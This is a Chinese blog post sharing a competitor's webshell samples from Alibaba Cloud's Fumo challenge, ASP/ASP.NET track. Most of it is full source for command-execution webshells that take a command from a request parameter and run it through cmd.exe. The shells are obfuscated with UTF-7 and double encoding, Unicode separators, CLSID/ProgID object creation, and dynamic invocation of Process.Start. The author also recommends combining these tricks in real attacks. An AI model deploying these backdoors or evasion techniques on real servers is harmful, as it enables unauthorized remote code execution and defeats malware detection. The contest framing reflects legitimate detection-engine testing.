
            <h1 class="postTitle">
                <a id="cb_post_title_url" class="postTitle2 vertical-middle" href="https://www.cnblogs.com/cwkiller/p/19030688" title="发布于 2025-08-10 14:22">
    <span role="heading" aria-level="2">伏魔挑战赛-ASP/ASP.NET赛道10+绕过样本思路分享</span>
    

</a>

            </h1>
            <div class="clear"></div>
            <div class="postBody">
                    <div id="cnblogs_post_description" style="display: none">
        
        前言 24年年底的时候参加了一下阿里云的第四届伏魔挑战赛，本着学习一下.NET的想法玩的ASP/AS
    </div>
<div id="cnblogs_post_body" class="blogpost-body cnblogs-markdown">
<h2 id="前言">前言</h2>
<p>24年年底的时候参加了一下阿里云的第四届伏魔挑战赛，本着学习一下<code>.NET</code>的想法玩的<code>ASP/ASP.NET</code>赛道。但是当时一直没空，等到活动最后一天才抽出时间测试。一个晚上提交了15个绕过样本，重复了12个太惨了这就是最后一天提交的结果，后来看榜单应该都是重复的<code>Ivan1ee</code>师傅的，专门研究.NET的还是强。第三届我也玩了提交17个样本重复5个通过12个，这篇文章挑部分绕过样本进行思路分析。</p>
<h2 id="asp">ASP</h2>
<p><code>asp</code>样本分享下面两个,绕过思路为前导零、双重编码。</p>
<h4 id="前导零">前导零</h4>
<p><code>asp</code>支持将代码<code>utf-7</code>编码，于是构造出下面<code>shell</code>样本进行测试。</p>
<pre><code>&lt;%@codepage=65000%&gt;
&lt;%
+AGUAdgBhAGwAKAByAGUAcQB1AGUAcwB0ACgAIgBrAGkAbABsAGUAcgAiACkAKQ-
%&gt;
</code></pre>
<p>可能因为是很久以前的公开手法直接被杀，注意到<code>codepage=65000</code>推测这里<code>65000</code>可能采用数字类型进行解析，在某些语言里有一种技巧在解析数字时会丢弃前导零。比如<code>065000</code>会被解析为<code>65000</code>。于是将<code>codepage</code>写为<code>065000</code>发现也可以成功解析，多次尝试以后发现最多写成<code>0000065000</code>可以识别成功。猜测原因是Long类型最长为十位数字，在解析之前对大于十位的数字直接报错或者不解析。于是提交如下样本成功绕过伏魔引擎。</p>
<pre><code>&lt;%@codepage=0000065000%&gt;
&lt;%
+AGUAdgBhAGwAKAByAGUAcQB1AGUAcwB0ACgAIgBrAGkAbABsAGUAcgAiACkAKQ-
%&gt;
</code></pre>
<h4 id="双重编码">双重编码</h4>
<p><code>asp</code>支持将代码<code>VBScript.Encode</code>编码。</p>
<pre><code>&lt;%@ LANGUAGE = "VBScript.Encode"%&gt;
&lt;%
#@~^LwAAAA==]A/2KxU+R1W93wmon'+*TT8)27CVvD+$;n/D`r3rVsnMJb#wg8AAA==^#~@
%&gt;
</code></pre>
<p>直接提交依然被杀。注意到<code>VBScript.Encode</code>和<code>utf-7</code>编码不是同一个配置项，于是想到能不能使用双重编码绕过，测试以后发现可以也能够被正确解析。绕过样本如下先使用<code>VBScript.Encode</code>编码内容再使用<code>utf-7</code>编码即可。</p>
<pre><code>&lt;%@ LANGUAGE = "VBScript.Encode" codepage=65000%&gt;
&lt;%
+ACM-+AEA-+AH4-+AF4-LwAAAA+AD0-+AD0-+AF0-A/2KxU+-R1W93wmon'+-+ACo-TT8)27CVvD+-+ACQ-+ADs-n/D+AGA-r3rVsnMJb+ACM-wg8AAA+AD0-+AD0-+AF4-+ACM-+AH4-+AEA-
%&gt;
</code></pre>
<p><img src="https://img2024.cnblogs.com/blog/858505/202508/858505-20250810142211719-468494947.png" alt="" loading="lazy"></p>
<h2 id="aspnet">ASP.NET</h2>
<p><code>aspx</code>的样本第三届的时候比较容易绕过，有很多污点源都没打标这类就不写了。主要写两类特殊语法、危险方法替换。</p>
<h4 id="特殊语法">特殊语法</h4>
<p>以前看别人绕<code>jsp</code>学到的使用注释<code>//</code>加<code>\u000a</code>换行进行来绕过</p>
<pre><code>&lt;%@ Page Language="Jscript"%&gt;
&lt;%
    var p = eval("//\u000a\u0052\u0065\u0071\u0075\u0065\u0073\u0074\u002E\u0049\u0074\u0065\u006D[\"g\"]")
    eval(p,"unsafe");
%&gt;
</code></pre>
<p>测试发现可以解析但是伏魔引擎检测为<code>webshell</code>查阅资料发现使用<code>\u2029</code>段落分隔符也可以起到换行的作用。测试可以解析并绕过。</p>
<pre><code>&lt;%@ Page Language="Jscript"%&gt;
&lt;%
    var p = eval("//\u2029\u0052\u0065\u0071\u0075\u0065\u0073\u0074\u002E\u0049\u0074\u0065\u006D[\"g\"]")
    eval(p,"unsafe");
%&gt;
</code></pre>
<p><code>aspx</code>支持下面这种语法，将多个<code>&lt;%...%&gt;</code>之间的代码相加。</p>
<pre><code>&lt;%@ Page Language="Jscript"%&gt;
&lt;%
    var p = eval(""%&gt;&lt;%+"\u0052\u0065\u0071\u0075\u0065\u0073\u0074\u002E\u0049\u0074\u0065\u006D[\"g\"]")
    eval(p,"unsafe");
%&gt;
</code></pre>
<p>测试发现无法绕过，在<code>%&gt;&lt;%</code>添加换行成功绕过。</p>
<pre><code>&lt;%@ Page Language="Jscript"%&gt;
&lt;%
    var p = eval(""%&gt;
&lt;%+"\u0052\u0065\u0071\u0075\u0065\u0073\u0074\u002E\u0049\u0074\u0065\u006D[\"g\"]")
    eval(p,"unsafe");
%&gt;
</code></pre>
<p><code>global::</code>是<code>C#</code>中的全局命名空间别名，它允许你明确地引用全局命名空间中的类型，避免命名冲突。所以可以写出下面的绕过样本。</p>
<pre><code>&lt;%@ Page Language="c#"%&gt;
&lt;%
global::System.Diagnostics.ProcessStartInfo psi = new global::System.Diagnostics.ProcessStartInfo();
psi.FileName = "cmd.exe";
psi.Arguments = "/c " + Request.Params.Get("g");
psi.RedirectStandardOutput = true;
psi.UseShellExecute = false;
global::System.Diagnostics.Process p = global::System.Diagnostics.Process.Start(psi);
System.IO.StreamReader stmrdr = p.StandardOutput;
string s = stmrdr.ReadToEnd();
stmrdr.Close();
Response.Write(s);
%&gt;
</code></pre>
<h4 id="危险方法替换">危险方法替换</h4>
<p>我们先写出一个经典的<code>aspx</code>调用<code>WScript.Shell</code>执行命令的<code>webshell</code>来进行变换。</p>
<pre><code>&lt;%@ Page Language="Jscript"%&gt;
&lt;%
var c=System.Web.HttpContext.Current;
var Request=c.Request;
var Response=c.Response;
var command = Request.Item['g'];
var r = new ActiveXObject("WScript.Shell").Exec("cmd /c "+command);
var OutStream = r.StdOut;
var Str = "";
while (!OutStream.atEndOfStream) {
    Str = Str + OutStream.readAll();
    }
Response.Write("&lt;pre&gt;"+Str+"&lt;/pre&gt;");
%&gt;
</code></pre>
<p>这个样本毫无疑问被杀，经过FUZZ发现关键点在于<code>ActiveXObject</code>和<code>WScript.Shell</code>不能同时出现。于是写出5种不同的绕过方式。<br>
使用<code>unescape("%57%53%63%72%69%70%74%2e%53%68%65%6c%6c")</code>代替<code>WScript.Shell</code></p>
<pre><code>&lt;%@ Page Language="Jscript"%&gt;
&lt;%
var c=System.Web.HttpContext.Current;
var Request=c.Request;
var Response=c.Response;
var command = Request.Item['g'];
var r = new ActiveXObject(unescape("%57%53%63%72%69%70%74%2e%53%68%65%6c%6c")).Exec("cmd /c "+command);
var OutStream = r.StdOut;
var Str = "";
while (!OutStream.atEndOfStream) {
    Str = Str + OutStream.readAll();
    }
Response.Write("&lt;pre&gt;"+Str+"&lt;/pre&gt;");
%&gt;
</code></pre>
<p>在<code>Jscript</code>中使用<code>GetObject</code>创建<code>WScript.Shell</code>对象</p>
<pre><code>&lt;%@ Page Language="Jscript"%&gt;
&lt;%
var c=System.Web.HttpContext.Current;
var Request=c.Request;
var Response=c.Response;
var command = Request.Item['g'];
var r = GetObject("new:72C24DD5-D70A-438B-8A42-98424B88AFB8").Exec("cmd /c "+command);
var OutStream = r.StdOut;
var Str = "";
while (!OutStream.atEndOfStream) {

    Str = Str + OutStream.readAll();

    }
Response.Write("&lt;pre&gt;"+Str+"&lt;/pre&gt;");
%&gt;
</code></pre>
<p>在<code>C#</code>中使用<code>GetTypeFromCLSID</code>来创建<code>WScript.Shell</code>对象</p>
<pre><code>&lt;%@ Page Language="C#" %&gt;
&lt;%
string command = Request.QueryString["cmd"];
if (!string.IsNullOrEmpty(command))
{
    try
    {
        // 使用 System.Type.GetTypeFromCLSID 来创建 WScript.Shell 对象
        Type shellType = Type.GetTypeFromCLSID(new Guid("72C24DD5-D70A-438B-8A42-98424B88AFB8"));
        dynamic shell = Activator.CreateInstance(shellType);
        dynamic exec = shell.Exec("cmd.exe /c " + command);
        dynamic stdout = exec.StdOut;
        string output = "";
        while (!stdout.AtEndOfStream)
        {
            output += stdout.ReadLine() + "\n";
        }
        Response.Write(output);
    }
    catch (Exception ex)
    {
        Response.Write($"Error: {Server.HtmlEncode(ex.Message)}");
    }
}
else
{
    Response.Write("No command");
}
%&gt;
</code></pre>
<p>在<code>C#</code>中使用<code>GetTypeFromProgID</code>来创建<code>WScript.Shell</code>对象</p>
<pre><code>&lt;%@ Page Language="C#" %&gt;
&lt;%
string command = Request.QueryString["cmd"];
if (!string.IsNullOrEmpty(command))
{
    try
    {
        // 使用 GetTypeFromProgID 创建 WScript.Shell 对象
        Type shellType = Type.GetTypeFromProgID("WScript.Shell");
        dynamic shell = Activator.CreateInstance(shellType);
        dynamic exec = shell.Exec("cmd.exe /c " + command);
        dynamic stdout = exec.StdOut;
        string output = "";
        while (!stdout.AtEndOfStream)
        {
            output += stdout.ReadLine() + "\n";
        }
        
        Response.Write(output);
    }
    catch (Exception ex)
    {
        Response.Write($"Error: {Server.HtmlEncode(ex.Message)}");
    }
}
else
{
    Response.Write("No command");
}
%&gt;
</code></pre>
<p>在<code>VB</code>中使用<code>CreateObject</code>来创建<code>WScript.Shell</code>对象</p>
<pre><code>&lt;%@ Page Language="VB" %&gt;
&lt;%
Dim command As String = Request.QueryString("cmd")
If Not String.IsNullOrEmpty(command) Then
    Try
        ' 使用CreateObject创建 WScript.Shell 对象
        Dim shell As Object = CreateObject("WScript.Shell")
        Dim exec As Object = shell.Exec("cmd.exe /c " &amp; command)
        Dim stdout As Object = exec.StdOut
        Dim output As String = ""
        While Not stdout.AtEndOfStream
            output &amp;= stdout.ReadLine() &amp; vbCrLf
        End While
        Response.Write(output)
    Catch ex As Exception
        Response.Write("Error: " &amp; ex.Message)
    End Try
Else
    Response.Write("No command")
End If
%&gt;
</code></pre>
<p>我们再写出一个使用<code>System.Diagnostics.Process.Start</code>来执行命令的经典样本。</p>
<pre><code>&lt;%@ Page Language="c#"%&gt;
&lt;%
System.Diagnostics.ProcessStartInfo psi = new System.Diagnostics.ProcessStartInfo();
psi.FileName = "cmd.exe";
psi.Arguments = "/c " + Request.Params.Get("g");
psi.RedirectStandardOutput = true;
psi.UseShellExecute = false;
System.Diagnostics.Process p = System.Diagnostics.Process.Start(psi);
System.IO.StreamReader stmrdr = p.StandardOutput;
string s = stmrdr.ReadToEnd();
stmrdr.Close();
Response.Write(s);
%&gt;
</code></pre>
<p>进过测试发现主要就是对调用<code>System.Diagnostics.Process.Start</code>方法进行了检测，传统思路就是通过反射来获取<code>Start</code>方法然后执行。进过测试对反射检测较为严格，于是转为寻找可以实现类似反射效果的方法。找到4种类似方法可以绕过。<br>
在<code>JScript</code>中使用<code>Function.apply</code>动态调用<code>Start</code>方法</p>
<pre><code>&lt;%@ Page Language="JScript" %&gt;
&lt;%
var userCommand = Request.Params["g"];
if (userCommand != null &amp;&amp; userCommand != "") {
    try {
        var psi = new System.Diagnostics.ProcessStartInfo();
        psi.FileName = "cmd.exe";
        psi.Arguments = "/c " + userCommand;
        psi.RedirectStandardOutput = true;
        psi.UseShellExecute = false;
        var process = new System.Diagnostics.Process();
        process.StartInfo = psi;
        // 使用 Function.apply 动态调用 Start 方法
        process.Start.apply(process, []);
        var output = process.StandardOutput.ReadToEnd();
        process.WaitForExit();
        Response.Write(Server.HtmlEncode(output));
    } catch (ex) {
        Response.Write("Error: " + Server.HtmlEncode(ex.Message));
    }
} else {
    Response.Write("No command");
}
%&gt;
</code></pre>
<p>在<code>VB</code>中委托绑定<code>Start</code>方法</p>
<pre><code>&lt;%@ Page Language="VB" %&gt;
&lt;%
Dim userCommand As String = Request.Params.Get("g")
If Not String.IsNullOrEmpty(userCommand) Then
    Try
        Dim psi As New System.Diagnostics.ProcessStartInfo()
        psi.FileName = "cmd.exe"
        psi.Arguments = "/c " &amp; userCommand
        psi.RedirectStandardOutput = True
        psi.UseShellExecute = False
        Dim process As New System.Diagnostics.Process()
        process.StartInfo = psi
        ' 使用委托绑定 Process.Start 方法
        Dim startMethod As StartDelegate = AddressOf process.Start
        startMethod.Invoke()
        Dim output As String = process.StandardOutput.ReadToEnd()
        process.WaitForExit()
        Response.Write(Server.HtmlEncode(output))
    Catch ex As Exception
        Response.Write("Error: " &amp; Server.HtmlEncode(ex.Message))
    End Try
Else
    Response.Write("No command")
End If
%&gt;
&lt;script runat="server"&gt;
Public Delegate Function StartDelegate() As Boolean
&lt;/script&gt;
</code></pre>
<p>在<code>VB</code>中使用<code>DynamicObject</code>动态调用<code>Start</code>方法</p>
<pre><code>&lt;%@ Page Language="VB" %&gt;
&lt;%@ Import Namespace="System.Dynamic" %&gt;
&lt;%
Dim userCommand As String = Request.Params.Get("g")
If Not String.IsNullOrEmpty(userCommand) Then
    Try
        Dim psi As New System.Diagnostics.ProcessStartInfo()
        psi.FileName = "cmd.exe"
        psi.Arguments = "/c " &amp; userCommand
        psi.RedirectStandardOutput = True
        psi.UseShellExecute = False
        Dim process As New System.Diagnostics.Process()
        process.StartInfo = psi
        ' 使用 DynamicProcess 动态调用 Start 方法
        Dim dynamicProcess As Object = New DynamicProcess(process)
        dynamicProcess.Start()
        Dim output As String = process.StandardOutput.ReadToEnd()
        process.WaitForExit()
        Response.Write(Server.HtmlEncode(output))
    Catch ex As Exception
        Response.Write("Error: " &amp; Server.HtmlEncode(ex.Message))
    End Try
Else
    Response.Write("No command")
End If
%&gt;
&lt;script runat="server"&gt;
Public Class DynamicProcess
    Inherits DynamicObject
    Private ReadOnly _process As System.Diagnostics.Process
    Public Sub New(process As System.Diagnostics.Process)
        _process = process
    End Sub
    Public Overrides Function TryInvokeMember(binder As InvokeMemberBinder, args() As Object, ByRef result As Object) As Boolean
        If binder.Name = "Start" Then
            result = _process.Start()
            Return True
        End If
        Return MyBase.TryInvokeMember(binder, args, result)
    End Function
End Class
&lt;/script&gt;
</code></pre>
<p>在<code>VB</code>中使用<code>CallByName</code>动态调用<code>Start</code>方法</p>
<pre><code>&lt;%@ Page Language="VB" %&gt;
&lt;%
Dim userCommand As String = Request.Params.Get("g")
If Not String.IsNullOrEmpty(userCommand) Then
    Try
        Dim psi As New System.Diagnostics.ProcessStartInfo()
        psi.FileName = "cmd.exe"
        psi.Arguments = "/c " &amp; userCommand
        psi.RedirectStandardOutput = True
        psi.UseShellExecute = False
        Dim process As New System.Diagnostics.Process()
        process.StartInfo = psi
        ' 使用 CallByName 动态调用 Process.Start
        CallByName(process, "Start", CallType.Method)
        Dim output As String = process.StandardOutput.ReadToEnd()
        process.WaitForExit()
        Response.Write(Server.HtmlEncode(output))
    Catch ex As Exception
        Response.Write("Error: " &amp; Server.HtmlEncode(ex.Message))
    End Try
Else
    Response.Write("No command")
End If
%&gt;
</code></pre>
<h2 id="总结">总结</h2>
<p>相对于<code>jsp/php</code>样本而言<code>asp/asp.net</code>样本的绕过还是相对比较简单，本文仅对提交的部分样本进行分析，主要绕过技术总结如下。</p>
<ol>
<li><strong>编码混淆</strong>：多层编码增加检测复杂度</li>
<li><strong>语法变形</strong>：利用语言特性实现功能等价替换</li>
<li><strong>反射替代</strong>：通过委托、动态调用等方式避开反射检测</li>
<li><strong>跨语言技巧</strong>：在 C#、VB、JScript 间灵活运用不同特性</li>
</ol>
<p><code>asp.net</code>支持多种语言如<code>VB/C#/JScript</code>这也变相增加了webshell的查杀难度。因为仅仅是测试引擎的绕过，实战中还需使用上述手法结合<code>Unicode</code>编码、特殊<code>Unicode</code>字符、命名空间别名、反射、注释等手段进行webshell混淆以达到最佳效果。</p>
<p><strong>如需上述样本进行测试研究可关注本公众号<code>漫漫安全路</code>，回复<code>aspx</code>得到下载地址。</strong></p>
<hr>
<p><em>本文仅供安全研究和学习使用，由于传播、利用此文档提供的信息而造成任何直接或间接的后果及损害，均由使用本人负责，公众号及文章作者不为此承担任何责任。</em></p>

</div>
<div class="clear"></div>

            </div>
            <div class="postDesc">posted @ 
<span id="post-date" data-last-update-days="0.0006944444444444445" data-date-updated="2025-08-10 14:23">2025-08-10 14:22</span>&nbsp;
<a href="https://www.cnblogs.com/cwkiller">cwkiller</a>&nbsp;
阅读(<span id="post_view_count">51</span>)&nbsp;
评论(<span id="post_comment_count">0</span>)&nbsp;
&nbsp;
<a href="javascript:void(0)" onclick="AddToWz(19030688);return false;">收藏</a>&nbsp;
<a href="javascript:void(0)" onclick="reportManager.report({ currentUserId: '', targetType: 'blogPost', targetId: '19030688', targetLink: 'https://www.cnblogs.com/cwkiller/p/19030688', title: '伏魔挑战赛-ASP/ASP.NET赛道10+绕过样本思路分享' })">举报</a>
</div>
        